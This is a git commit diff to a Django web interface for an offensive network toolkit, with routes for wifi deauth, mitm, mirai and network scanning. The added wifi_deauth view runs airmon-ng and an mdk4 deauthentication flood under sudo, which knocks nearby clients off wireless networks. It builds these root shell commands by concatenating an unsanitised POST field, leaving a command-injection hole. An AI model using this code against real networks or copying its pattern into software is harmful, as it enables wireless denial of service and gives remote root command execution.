14ca56a4f1ab44187f7ee57c812b7562c66c3054
BatukeshwarVats <2018ucs0063@iitjammu.ac.in>
2021-11-16 15:29:14 +0530

    Wifi deauth working

--- ui/urls.py
+++ ui/urls.py
@@ -5,8 +5,9 @@ from django.contrib import admin
 
 urlpatterns=[
     path('',views.index,name='uihome'),
-    path('ip/',views.ip_check,name='uihome'),
+    path('ip_check/',views.ip_check,name='uihome'),
     path('wifi/',views.wifi,name='wifi_deauth'),
+    path('wifi_deauth/',views.wifi_deauth,name='wifi_deauth'),
     path('mitm/',views.mitm,name='mitm'),
     path('mirai/',views.mirai,name='mirai'),
     path('ns/',views.net,name='net_scan'),
--- ui/views.py
+++ ui/views.py
@@ -1,11 +1,36 @@
 from django.shortcuts import render,get_object_or_404
+from django.http import HttpResponse
+import os
+import subprocess
 
 def index(request):
     return render(request,'ui/index.html')
 def  ip_check(request):
-    return render(request,'ui/ip_check.html')
+    command="sudo ifconfig"
+    result=subprocess.run(command.split(' '),stdout=subprocess.PIPE)
+    res=result.stdout.decode('utf-8')
+    print(" Result is",type(res))
+    return render(request,'ui/ip_check.html',{"res":str(res)})
 def wifi(request):
     return render(request,'ui/wifi.html')
+
+def wifi_deauth(request):
+    if request.method=="POST":
+        interface=request.POST.get('iface','')
+        print(interface)
+        print("hello")
+        y="xterm -hold -e sudo airmon-ng start "+interface
+        print("hi")
+        os.system(y)
+        os.system("xterm -hold -e sudo airmon-ng check kill")
+        z="xterm -hold -e sudo mdk4 "+interface+"mon d"
+        os.system(z)
+        print("hfdjhkj")
+        i="xterm -hold -e sudo airmon-ng stop "+interface+"mon"
+        os.system(i)
+        os.system("sudo service network-manager restart")
+        return render(request,'ui/deauth.html')
+
 def ps(request):
     return render(request,'ui/ps.html')
 def mitm(request):
